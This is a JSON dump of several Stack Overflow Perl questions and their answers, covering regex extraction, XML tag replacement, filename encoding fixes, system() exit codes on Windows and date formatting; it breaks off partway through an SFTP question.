[{"tags": ["perl"], "comments": [{"owner": {"reputation": 25463, "user_id": 5003756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8BUMb.jpg?s=128&g=1", "display_name": "James", "link": "https://stackoverflow.com/users/5003756/james"}, "edited": false, "score": 1, "creation_date": 1574887524, "post_id": 59078168, "comment_id": 104393443, "body": "Why did you add the <code>c</code>, <code>python</code>, <code>unix</code> and <code>shell</code> tags?"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1574887730, "post_id": 59078168, "comment_id": 104393532, "body": "So, why do you have the semicolons in the scalar variable confusingly named $Array? Why do you have the trailing in the Output line, when it&#39;s not mentioned in the description of the output? Do you want to produce the output, or populate 12 variables? (BTW, it&#39;s much better to use an array instead of 12 variables)"}, {"owner": {"reputation": 1, "user_id": 12448210, "user_type": "registered", "profile_image": "https://graph.facebook.com/2646644138738805/picture?type=large", "display_name": "Meryem Boussayri", "link": "https://stackoverflow.com/users/12448210/meryem-boussayri"}, "edited": false, "score": 0, "creation_date": 1574888083, "post_id": 59078168, "comment_id": 104393662, "body": "I want it to be 111; 222; 333; 444; 555 ;;;;; but each value bind a name"}, {"owner": {"reputation": 1, "user_id": 12448210, "user_type": "registered", "profile_image": "https://graph.facebook.com/2646644138738805/picture?type=large", "display_name": "Meryem Boussayri", "link": "https://stackoverflow.com/users/12448210/meryem-boussayri"}, "edited": false, "score": 0, "creation_date": 1574888376, "post_id": 59078168, "comment_id": 104393792, "body": "input from a machine and I wanted to convert example output and currency by 12 fields even if it is empty whatever the condtion to send it to another machine"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 12448210, "user_type": "registered", "profile_image": "https://graph.facebook.com/2646644138738805/picture?type=large", "display_name": "Meryem Boussayri", "link": "https://stackoverflow.com/users/12448210/meryem-boussayri"}, "edited": false, "score": 0, "creation_date": 1574889716, "post_id": 59078416, "comment_id": 104394297, "body": "Thank you for your answer the result is perfect but the problem how to put each value on an example param: 111 in <code>print Data1 = 111</code> or <code>data2 = 222</code> ...... <code>data12 = empty</code>  in the example I try to display <code>values1</code> or <code>data1</code> but will not work"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "reply_to_user": {"reputation": 1, "user_id": 12448210, "user_type": "registered", "profile_image": "https://graph.facebook.com/2646644138738805/picture?type=large", "display_name": "Meryem Boussayri", "link": "https://stackoverflow.com/users/12448210/meryem-boussayri"}, "edited": false, "score": 0, "creation_date": 1574894512, "post_id": 59078416, "comment_id": 104395884, "body": "Use <code>$values[0]</code> instead for Data1 etc."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1574888756, "creation_date": 1574888756, "answer_id": 59078416, "question_id": 59078168, "link": "https://stackoverflow.com/questions/59078168/i-have-problems-converting-data-using-perl/59078416#59078416", "title": "I have problems converting data using Perl?", "body": "<p>You can ignore the commas, semicolons and curly brackets, and use a regex match to extract just adjacent digits. I used an array instead of 12 scalar values, as it usually makes more sense.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nmy $data = ';{111,222},{333,444},{555,666};';\nmy @values = $data =~ /([0-9]+)/g;\npush @values, (\"\") x (12 - @values);\nmy $output = join ';', \"\", @values[0..11];\n</code></pre>\n\n<p>The <a href=\"http://p3rl.org/push\" rel=\"nofollow noreferrer\">push</a> line adds the missing empty values so the array always has 12 elements.</p>\n\n<p>The empty string after <a href=\"http://p3rl.org/join\" rel=\"nofollow noreferrer\">join</a> is there to prepend the leading semicolon.</p>\n"}], "owner": {"reputation": 1, "user_id": 12448210, "user_type": "registered", "profile_image": "https://graph.facebook.com/2646644138738805/picture?type=large", "display_name": "Meryem Boussayri", "link": "https://stackoverflow.com/users/12448210/meryem-boussayri"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 33, "favorite_count": 2, "closed_date": 1574929256, "accepted_answer_id": 59078416, "answer_count": 1, "score": -3, "last_activity_date": 1574888756, "creation_date": 1574887475, "last_edit_date": 1574888343, "question_id": 59078168, "link": "https://stackoverflow.com/questions/59078168/i-have-problems-converting-data-using-perl", "closed_reason": "Needs more focus", "title": "I have problems converting data using Perl?", "body": "<p><strong>I want to convert</strong> \nthis input <code>{111,222},{333,444},{555,666}</code> so that the output be like this <code>111;222;333;444;555;666</code>. </p>\n\n<pre><code>$Data =\";{111,222},{333,444},{555,666};\"\nInput : ;{111,222},{333,444},{555,666};\nOutput: ;111;222;333;444;555;666;;;;;;\n$Data1 =\"111\";\n$Data2 =\"222\";\n$Data4 =\"333\";\n$Data5 =\"444\";\n$Data6 =\"555\";\n$Data7 =\"666\";\n$Data8 =\"\";\n$Data9 =\"\";\n................\n$Data12 =\"\";\n</code></pre>\n\n<p><strong>OR</strong> The same thing goes for <code>{111,222},{333,444}</code> to <code>111;222;333;444</code></p>\n\n<pre><code>$Data =\";{111,222},{333,444};\"\nInput : ;{111,222},{333,444};\nOutput: ;111;222;333;444;;;;;;;;\n$Data1 =\"111\";\n$Data2 =\"222\";\n$Data4 =\"333\";\n$Data5 =\"444\";\n$Data6 =\"\";\n$Data7 =\"\";\n$Data8 =\"\";\n$Data9 =\"\";\n................\n$Data12 =\"\";\n</code></pre>\n\n<p><strong>OR</strong> and <code>{111,222}</code> to <code>111;222</code>.</p>\n\n<pre><code>$Data =\";{111,222};\"\nInput : ;{111,222};\nOutput: ;111;222;;;;;;;;;;\n$Data1 =\"111\";\n$Data2 =\"222\";\n$Data4 =\"\";\n$Data5 =\"\";\n$Data6 =\"\";\n$Data7 =\"\";\n$Data8 =\"\";\n$Data9 =\"\";\n................\n$Data12 =\"\";\n</code></pre>\n\n<p><strong>OR</strong> </p>\n\n<pre><code>$Data =\"; ;\"\nInput : ;;\nOutput: ;;;;;;;;;;;;\n$Data1 =\"\";\n$Data2 =\"\";\n$Data4 =\"\";\n$Data5 =\"\";\n$Data6 =\"\";\n$Data7 =\"\";\n$Data8 =\"\";\n$Data9 =\"\";\n................\n$Data12 =\"\";\n</code></pre>\n\n<p>input from a machine and I wanted to convert example output and currency by 12 fields even if it is empty whatever the condtion to send it to another machine\nI am beginner in perl and thank you for helping me</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 4244, "user_id": 3348112, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ab4cd9458f5debd780353a5554b718d8?s=128&d=identicon&r=PG&f=1", "display_name": "CAustin", "link": "https://stackoverflow.com/users/3348112/caustin"}, "edited": false, "score": 0, "creation_date": 1574887529, "post_id": 59078113, "comment_id": 104393446, "body": "Can you give specific examples of input strings that worked as expected, vs ones that should have matched but didn&#39;t? If you&#39;re just wondering about how to make your regex quantifiers lazy instead of greedy, that&#39;s done by adding a <code>?</code>, i.e. <code>&lt;.+?house&gt;</code>."}, {"owner": {"reputation": 19159, "user_id": 3600709, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/731c8c4c0029d3414563333de16b8977?s=128&d=identicon&r=PG&f=1", "display_name": "ctwheels", "link": "https://stackoverflow.com/users/3600709/ctwheels"}, "edited": false, "score": 0, "creation_date": 1574887534, "post_id": 59078113, "comment_id": 104393448, "body": "Try <a href=\"https://regex101.com/r/dqsKoB/1\" rel=\"nofollow noreferrer\">this</a>: <code>s&#47;(&lt;([^&gt;]+)house&gt;).*?(&lt;\\&#47;\\2house&gt;)&#47;$1xxx$3&#47;g</code> if you must use regex; preferably, use a parser."}, {"owner": {"reputation": 21, "user_id": 8620624, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-fvoA0TiuUN4/AAAAAAAAAAI/AAAAAAAAADk/h57AzKKqRMI/photo.jpg?sz=128", "display_name": "dwfa", "link": "https://stackoverflow.com/users/8620624/dwfa"}, "edited": false, "score": 0, "creation_date": 1575041090, "post_id": 59078113, "comment_id": 104446382, "body": "The actual sample is too large to display here (and of course I had to change the name of the tags to protect the innocent).  I do know that this (unable to provide sample) is a limitation I need to deal with; but thx for your support."}, {"owner": {"reputation": 21, "user_id": 8620624, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-fvoA0TiuUN4/AAAAAAAAAAI/AAAAAAAAADk/h57AzKKqRMI/photo.jpg?sz=128", "display_name": "dwfa", "link": "https://stackoverflow.com/users/8620624/dwfa"}, "edited": false, "score": 0, "creation_date": 1575042240, "post_id": 59078113, "comment_id": 104446901, "body": "I should have added that the XML is not always a complete XML document, it could be a snippet and is not guaranteed to be well-formatted (i.e. have all tags balanced)."}], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 3, "last_activity_date": 1574887603, "creation_date": 1574887603, "answer_id": 59078194, "question_id": 59078113, "link": "https://stackoverflow.com/questions/59078113/perl-regular-expression-issues-now-i-have-no-hair/59078194#59078194", "title": "Perl Regular Expression issues, now I have no hair", "body": "<p><a href=\"https://stackoverflow.com/a/1732454/5848200\">Don't use regular expressions</a>, all your problems are because of this approach. There are several options for XML parsers, here's how you could do it with <a href=\"https://metacpan.org/pod/Mojo::DOM\" rel=\"nofollow noreferrer\">Mojo::DOM</a>:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Mojo::DOM;\n\nmy $data = q{&lt;ns0:house&gt;indifferent token&lt;/ns0:house&gt;};\nmy $dom = Mojo::DOM-&gt;new-&gt;xml(1)-&gt;parse($data);\nforeach my $tag ($dom-&gt;find('house')-&gt;each) {\n  $tag-&gt;content('xxx'); # this should already be XML-escaped if needed\n}\nprint $dom;\n</code></pre>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "is_accepted": false, "score": 2, "last_activity_date": 1574889961, "last_edit_date": 1574889961, "creation_date": 1574888975, "answer_id": 59078465, "question_id": 59078113, "link": "https://stackoverflow.com/questions/59078113/perl-regular-expression-issues-now-i-have-no-hair/59078465#59078465", "title": "Perl Regular Expression issues, now I have no hair", "body": "<p>A good regex to find house open/close tag and replace it's content<br>\nwith xxx :  </p>\n\n<p><code>$data =~ s/(?s)&lt;((?&gt;[\\w:]+:)?house)(?&gt;\\s+(?:\".*?\"|'.*?'|[^&gt;]*?)+)?\\s*&gt;(?&lt;!\\/&gt;)\\K(?:(?!&lt;\\/\\1\\s*&gt;).)*?(?=&lt;\\/\\1\\s*&gt;)/xxx/g;</code></p>\n\n<p>or something quicker   </p>\n\n<p><code>$data =~ s/(?s)&lt;((?&gt;[\\w:]+:)?house)(?&gt;\\s+(?:\".*?\"|'.*?'|[^&gt;]*?)+)?\\s*&gt;(?&lt;!\\/&gt;)\\K.*?(?=&lt;\\/\\1\\s*&gt;)/xxx/g;</code></p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 8620624, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-fvoA0TiuUN4/AAAAAAAAAAI/AAAAAAAAADk/h57AzKKqRMI/photo.jpg?sz=128", "display_name": "dwfa", "link": "https://stackoverflow.com/users/8620624/dwfa"}, "is_accepted": false, "score": 0, "last_activity_date": 1575044282, "creation_date": 1575044282, "answer_id": 59108175, "question_id": 59078113, "link": "https://stackoverflow.com/questions/59078113/perl-regular-expression-issues-now-i-have-no-hair/59108175#59108175", "title": "Perl Regular Expression issues, now I have no hair", "body": "<p>Thanks to all who provided suggestions and support. I found a solution that seems to be working and here is the RegEx</p>\n\n<pre><code>s/(&lt;([^&gt;]+)(house)&gt;)(.*?)(&lt;\\/\\2\\3&gt;)/$1xxx$5/g\n</code></pre>\n\n<p>yeah !!! - thx again</p>\n\n<p>To make it even more extensible, in my mind, I used perl variable substitution capability</p>\n\n<pre><code>s/(&lt;([^&gt;]+)(\\Q$token\\E)&gt;)(.*?)(&lt;\\/\\2\\3&gt;)/$1xxx$5/g\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 8620624, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-fvoA0TiuUN4/AAAAAAAAAAI/AAAAAAAAADk/h57AzKKqRMI/photo.jpg?sz=128", "display_name": "dwfa", "link": "https://stackoverflow.com/users/8620624/dwfa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "closed_date": 1575050062, "answer_count": 3, "score": 1, "last_activity_date": 1575044282, "creation_date": 1574887205, "question_id": 59078113, "link": "https://stackoverflow.com/questions/59078113/perl-regular-expression-issues-now-i-have-no-hair", "closed_reason": "Duplicate", "title": "Perl Regular Expression issues, now I have no hair", "body": "<p>In essence I am trying to modify every token on a line that matches a criteria.  I have a file with many lines and the the line can have many instances. Each line may or may not match.  What I want to replace ar XML values, for example</p>\n\n<pre><code>&lt;ns0:house&gt;indifferent token&lt;/ns0:house&gt; --&gt; &lt;ns0:house&gt;xxx&lt;/ns0:house&gt;\nthe token indifferent token will be replaced with xxx\n</code></pre>\n\n<p>It is not guaranteed that the XML be completed (it could be snippet) ...</p>\n\n<p>Here is what I have</p>\n\n<pre><code> $output =~ s/(&lt;.+house&gt;)(.*)(\\/.+house&gt;)/$1xxx$3/g\n</code></pre>\n\n<p>I would read this as substitute, globally, all characters between  and  (I simplified the XMl element (but the .+ should account for any arbitrary namespace).</p>\n\n<p>The resulting string has only some occurrence replaced.  Logically in my head I know it has to do with the REGEX being greedy, but I cannot figure out how to fix it.  I have pulled all my hair out trying to work around this.</p>\n\n<p>I believe I have an alternative (more code) using split, but that is ugly.</p>\n\n<p>Thought or suggestions welcomed.  </p>\n"}, {"tags": ["regex", "bash", "perl", "rename", "batch-rename"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "edited": false, "score": 0, "creation_date": 1574881332, "post_id": 59076781, "comment_id": 104390966, "body": "\\366 is octal for \\x{F6} or &#246;. It might be better to run a Perl script to put some logic into it. For example <code>s&#47;&#39;\\$&#39;\\\\([0-3][0-7]{2})&#39;&#39;&#47;func($1)&#47;eg</code> then in func, convert the octal text into a character to return (substitute)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user12097764"}, "edited": false, "score": 0, "creation_date": 1574881674, "post_id": 59076781, "comment_id": 104391113, "body": "Where the <code>&#47;&#47;&#47;e</code> form is eval()."}, {"owner": {"reputation": 1, "user_id": 12447773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ae832fedf625dadb3076fc43f554250?s=128&d=identicon&r=PG&f=1", "display_name": "user12447773", "link": "https://stackoverflow.com/users/12447773/user12447773"}, "edited": false, "score": 0, "creation_date": 1574928407, "post_id": 59076781, "comment_id": 104404342, "body": "At the end I managed to solve it myself. Rename command will not do, the important bit is to found out what encoding the file have and then run:  find ./ -execdir convmv -fiso-8859-1 -tutf8 {} \\; When sure it works, just add --notest"}], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 1, "last_activity_date": 1574885552, "creation_date": 1574885552, "answer_id": 59077818, "question_id": 59076781, "link": "https://stackoverflow.com/questions/59076781/replace-part-of-file-name-with-wrong-encoding/59077818#59077818", "title": "replace part of file name with wrong encoding", "body": "<p>The first question is what encoding your terminal expects. Make sure that is UTF-8.</p>\n\n<p>Then you need to find what bytes the actual filename contains, not just what something might display it as. You can do this with a perl oneliner like follows, run in the directory containing the file:</p>\n\n<pre><code>perl -E'opendir my $dh, \".\"; printf \"%s: %vX\\n\", $_, $_ for grep { m/jesedel\\.pdf/ } readdir $dh'\n</code></pre>\n\n<p>This will output the filename interpreted as UTF-8 bytes (if you've set your terminal to that) followed by the hex bytes it actually contains.</p>\n\n<p>Using that you can determine what your search pattern should be. Your replacement must be the UTF-8 encoded representation of <code>\u00f6</code>, which it will be by default as part of the command arguments if your terminal is set to that.</p>\n"}, {"tags": [], "owner": {"reputation": 11918, "user_id": 12098405, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-C7IUyuZ5qqE/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rehqQyGdh463Xz2DY8S4TYPhnDvzA/photo.jpg?sz=128", "display_name": "dash-o", "link": "https://stackoverflow.com/users/12098405/dash-o"}, "is_accepted": false, "score": 0, "last_activity_date": 1574886808, "creation_date": 1574886808, "answer_id": 59078031, "question_id": 59076781, "link": "https://stackoverflow.com/questions/59076781/replace-part-of-file-name-with-wrong-encoding/59078031#59078031", "title": "replace part of file name with wrong encoding", "body": "<p>I'm not an expert - but it might not be a problem with the file name (which seems to hold the correct Unicode file name) - but with the way ls (and many other utilities) show the name to the terminal.</p>\n\n<p>I was able to show the correct name by setting the terminal character encoding to Unicode. Also I've noticed the GUI programs (file manager, etc), were able to show the correct file name.</p>\n\n<p>Gnome Terminal: \"Terminal .. set character encoding - Unicode UTF8</p>\n\n<p>It is still a challenge with many utilities to 'select' those files (e.g., REGEXP, wildcard). In few cases, you will have to select those character using '*' pattern. If this is a major issue considering using Ascii only - may be use the 'o' instead of '\u00f6'. Not sure if this is acceptable.</p>\n"}], "owner": {"reputation": 1, "user_id": 12447773, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ae832fedf625dadb3076fc43f554250?s=128&d=identicon&r=PG&f=1", "display_name": "user12447773", "link": "https://stackoverflow.com/users/12447773/user12447773"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1574886808, "creation_date": 1574880670, "question_id": 59076781, "link": "https://stackoverflow.com/questions/59076781/replace-part-of-file-name-with-wrong-encoding", "title": "replace part of file name with wrong encoding", "body": "<p>Need some guidance how to solve this one. Have 10 000s of files in multiple subfolders where the encoding got screwed up. Via ls command I see a filename named like this 'F'$'\\366''ljesedel.pdf', that includes the ' at beginning and end. That's just one example where the Swedish characters \u00e5\u00e4\u00f6 got wrong, in this example this should have been 'F\u00f6ljesedel.pdf'. If If I run \n    #>find .\nThen I see a list of files like this:\n./F?ljesedel.pdf</p>\n\n<p>Not the same encoding. How on earth solving this one? The most obvious ways:</p>\n\n<pre><code>  myvar='$'\\366''\n  char=\"\u00f6\"\n  find . -name *$myvar*   -exec rename 's/$myvar/\u00f6'  {} \\;\n</code></pre>\n\n<p>and other possible ways fails since\n      find . -name cannot find it due to the ? instead of the \"real\" characters \" '$'\\366'' \"</p>\n\n<p>Any suggestions or guidance would be very much appreciated. </p>\n"}, {"tags": ["perl", "system", "return-value"], "comments": [{"owner": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 0, "creation_date": 1574877760, "post_id": 59075840, "comment_id": 104389461, "body": "This <code>perl -e &quot;system(&#39;explorer c:\\user&#39;); print $?&quot;;</code> gives the same: <code>256</code>. And folder will be openend."}, {"owner": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 0, "creation_date": 1574950186, "post_id": 59075840, "comment_id": 104415984, "body": "I&#39;m interested why I got a -1."}], "answers": [{"comments": [{"owner": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "edited": false, "score": 0, "creation_date": 1574877994, "post_id": 59075936, "comment_id": 104389558, "body": "OK. But why $? is not 0?"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "edited": false, "score": 0, "creation_date": 1574878137, "post_id": 59075936, "comment_id": 104389624, "body": "Your command returned a status of 1, I don&#39;t know anything about why Windows would do that."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1574879641, "post_id": 59075936, "comment_id": 104390302, "body": "Interestingly, <code>explorer c:\\user</code> followed by <code>echo %errorlevel%</code> --<code>cmd</code>&#39;s version of <code>echo $?</code>-- outputs <code>0</code>."}, {"owner": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1574925219, "post_id": 59075936, "comment_id": 104403030, "body": "@ikegami This makes it more curious and mysterious."}], "tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 3, "last_activity_date": 1574877644, "last_edit_date": 1574877644, "creation_date": 1574877275, "answer_id": 59075936, "question_id": 59075840, "link": "https://stackoverflow.com/questions/59075840/perl-system-return-code-is-256-instead-of-0/59075936#59075936", "title": "Perl: system return code is 256 instead of 0", "body": "<p>From the <a href=\"https://perldoc.pl/functions/system\" rel=\"nofollow noreferrer\">system function docs</a>:</p>\n\n<blockquote>\n  <p>The return value is the exit status of the program as returned by the wait call. To get the actual exit value, shift right by eight (see below).</p>\n</blockquote>\n\n<p>The same value is set in <code>$?</code> which <a href=\"https://perldoc.pl/variables/$%3F\" rel=\"nofollow noreferrer\">documents this further</a>:</p>\n\n<blockquote>\n  <p>This is just the 16-bit status word returned by the traditional Unix wait() system call (or else is made up to look like it). Thus, the exit value of the subprocess is really ($? >> 8), and $? &amp; 127 gives which signal, if any, the process died from, and $? &amp; 128 reports whether there was a core dump.</p>\n</blockquote>\n\n<p>Also note that either can be set to -1 if there was a fork or exec error (in which case the errno is set in <code>$!</code>).</p>\n\n<p>So this means that when executing your second command, it indicated an exit status of 1 (256 >> 8). I don't know what that means in the context of Windows.</p>\n"}], "owner": {"reputation": 2197, "user_id": 1236569, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f0f377976002909c580d08c57f3c3676?s=128&d=identicon&r=PG", "display_name": "giordano", "link": "https://stackoverflow.com/users/1236569/giordano"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1208, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1574950382, "creation_date": 1574876919, "last_edit_date": 1574950382, "question_id": 59075840, "link": "https://stackoverflow.com/questions/59075840/perl-system-return-code-is-256-instead-of-0", "title": "Perl: system return code is 256 instead of 0", "body": "<p>I have an oneliner (perl 5 on Windows 7/10):</p>\n\n<pre><code>C:\\Windows&gt;perl -e \"$x=system('echo c:\\users');print $x\";\n</code></pre>\n\n<p>which gives me the expected outputs:</p>\n\n<pre><code>c:\\users\n0\n</code></pre>\n\n<p>But if I have this:</p>\n\n<pre><code>C:\\Windows&gt;perl -e \"$x=system('explorer c:\\users');print $x\";\n</code></pre>\n\n<p>this gives me:</p>\n\n<pre><code>256\n</code></pre>\n\n<p>and opens the folder. </p>\n\n<p>I'm curious why the output is not 0 since the command executed correctly.</p>\n\n<p>Similar question is <a href=\"https://stackoverflow.com/questions/39082049/return-code-of-system-256\">here</a> but it was not answered. This question here is more concrete. Maybe somebody can answer this specific issue.</p>\n\n<p>UPDATE 1:</p>\n\n<p>(1) I corrected the path from c:\\user to c:\\users. The former path was wrong and file explorer C:\\Users\\giordano\\Documents was opened. With this correction the correct file folder is openend but still returns 256.</p>\n\n<p>(2) Better coding:</p>\n\n<pre><code>C:\\Windows&gt;perl -e \"system('explorer c:\\users');print $?\";\n</code></pre>\n"}, {"tags": ["perl", "datetime"], "comments": [{"owner": {"reputation": 4524, "user_id": 8893864, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-mfBb3bzlcfw/AAAAAAAAAAI/AAAAAAAAADM/vILdjUEHHM8/photo.jpg?sz=128", "display_name": "Holli", "link": "https://stackoverflow.com/users/8893864/holli"}, "edited": false, "score": 2, "creation_date": 1574872688, "post_id": 59073570, "comment_id": 104386972, "body": "I think you mean 22:00:00"}], "answers": [{"tags": [], "owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "is_accepted": false, "score": 2, "last_activity_date": 1574868986, "creation_date": 1574868986, "answer_id": 59073670, "question_id": 59073570, "link": "https://stackoverflow.com/questions/59073570/converting-string-to-date-time-using-perl/59073670#59073670", "title": "Converting string to date time using Perl", "body": "<p>The strptime and strftime functions can do this. One version of these is provided by the core module <a href=\"https://perldoc.pl/Time::Piece\" rel=\"nofollow noreferrer\">Time::Piece</a>:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Time::Piece;\n\nmy $time = '10:00';\nmy $ampm = 'PM';\nmy $date = '11/27/2019';\n\nmy $tp = Time::Piece-&gt;strptime(\"$date $time $ampm\", '%m/%d/%Y %I:%M %p');\nprint $tp-&gt;strftime('%Y-%m-%d %H:%M:%S'), \"\\n\";\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 12446815, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/622a4f34ba7a85db663b8ffedc1ec4e4?s=128&d=identicon&r=PG&f=1", "display_name": "JBD", "link": "https://stackoverflow.com/users/12446815/jbd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1574870707, "creation_date": 1574868611, "last_edit_date": 1574870707, "question_id": 59073570, "link": "https://stackoverflow.com/questions/59073570/converting-string-to-date-time-using-perl", "title": "Converting string to date time using Perl", "body": "<p>I am not a perl programmer, but I'm trying to update someone else's code.  I need to format the date and time. I have three variables returned from a database. One variable contains the time, one has AM/PM, on has the date in <code>mm/dd/yyyy</code> format. For example:</p>\n\n<pre><code>variable1 = 10:00\nvariable2 = PM\nvariable3 = 11/27/2019\n</code></pre>\n\n<p>I need to take these three variables and format them accordingly: <strong>2019-11-27 20:00:00</strong></p>\n\n<p>How could I go about doing this?</p>\n"}, {"tags": ["perl", "download", "sftp"], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 12446481, "user_type": "registered", "profile_image": "https://graph.facebook.com/2465939396976866/picture?type=large", "display_name": "Marco Fillip Filzinger", "link": "https://stackoverflow.com/users/12446481/marco-fillip-filzinger"}, "edited": false, "score": 0, "creation_date": 1574925948, "post_id": 59073909, "comment_id": 104403305, "body": "Thanks, sound nice. i will give it a try."}], "tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": true, 